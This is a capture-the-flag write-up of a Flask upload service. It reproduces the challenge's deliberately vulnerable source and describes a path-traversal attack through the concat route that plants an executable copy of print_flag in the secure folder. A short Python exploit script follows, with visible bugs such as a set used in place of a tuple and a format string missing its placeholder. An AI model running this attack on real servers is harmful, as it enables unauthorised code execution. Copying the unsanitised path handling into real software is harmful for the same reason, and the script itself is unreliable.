First of all, i want to say, that author is kid in creating tasks. This code
is awful.  
**works as intended (c)**  
.=================================================================

Okay, we have source code (we could find it here: https://my-
project.chujowyc.tf/source)  
```  
#!/usr/bin/python

from PyPDF4 import PdfFileReader  
from io import BytesIO  
from uuid import uuid1  
from flask import Flask, render_template_string, request, make_response,
redirect, abort

app = Flask(__name__)

def check_tekstfile(file):  
   try:  
       # pdf  
       PdfFileReader(BytesIO(file))  
   except:  
       # plik .txt  
       for c in file:  
           if c not in range(1, 128):  
               return False  
       return True  
   return True

@app.route('/')  
def index():  
   with open('index.html', 'r') as f:  
       s = f.read()  
   return render_template_string(s)

@app.route('/source')  
def source():  
   with open('source.html', 'r') as f:  
       s = f.read()  
   return render_template_string(s)

@app.route('/upload', methods=['POST'])  
def upload():  
   f = request.files['file']  
   s = f.read()  
   if not check_tekstfile(s):  
       return 'not a tekst'  
   uuid = uuid1().hex  
   with open('./files/' + f.filename + uuid, 'wb') as ff:  
       ff.write(s)  
   return 'link: Klik'

@app.route('/files', methods=['GET'])  
def uploads():  
   try:  
       return send_file('./files/' + request.args['filename'])  
   except:  
       return 'no file'

# FIXME: z jakiegos powodu nie dziala concatowanie pdfow  
@app.route('/concat', methods=['POST'])  
def concat():  
   with open('./files/' + request.args['filename1'], 'rb') as f2:  
       s2 = f2.read()  
   f = request.files['file']  
   s = f.read()  
   if not check_tekstfile(s):  
       return 'not a tekst'  
   uuid = uuid1().hex  
   with open('./files/' + f.filename + uuid, 'wb') as ff:  
       ff.write(s2 + s)  
   return 'link: Klik'

@app.route('/flag/<name>', methods=['GET'])  
def flag(name):  
   from pathlib import Path  
   from subprocess import check_output  
   import os  
   path = Path('./secure/').joinpath(name)  
   assert path.parent.name == 'secure'  
   assert path.name != 'print_flag'  
   assert open(path, 'rb').read(1) != ord('#')  
   os.chmod(path, 0o700, follow_symlinks=False)  
   return check_output([path]).decode('ascii')  
```  
The service has only 4 functions: upload, files, concat, flag (ans function
**files** not working at all).

As we can understand, function *files* function not working, and for this
reason we didn't interest in it.  
Let's take attention to *flag* function. Here we check, if we take file from
*secure* folder and filename isn't *print_flag*.  
It is easy to understand, that we need to get *print_flag*.

Okey, let's try to use **path traversal** attack.

1) Upload file in **../secure/** folder (via concat)  
2) Use *concat* function with file **../secure/filename** and
**../secure/print_flag**  
3) Use *flag/filename* to get flag.

Final code:  
```  
import requests as req

URL = ""  
files = {"file": {"../secure/ctfby", ""} }

r = req.post(URL + "concat?filename".format("../secure/print_flag"),
files=files)  
uuid = r.text.split("filename")[1].split('">')[0]

r = req.get(URL + "flag/{}".format("ctfby" + uuid))  
print(r.text)  
```

Join my telegram channel about CTF in Belarus! @ctfby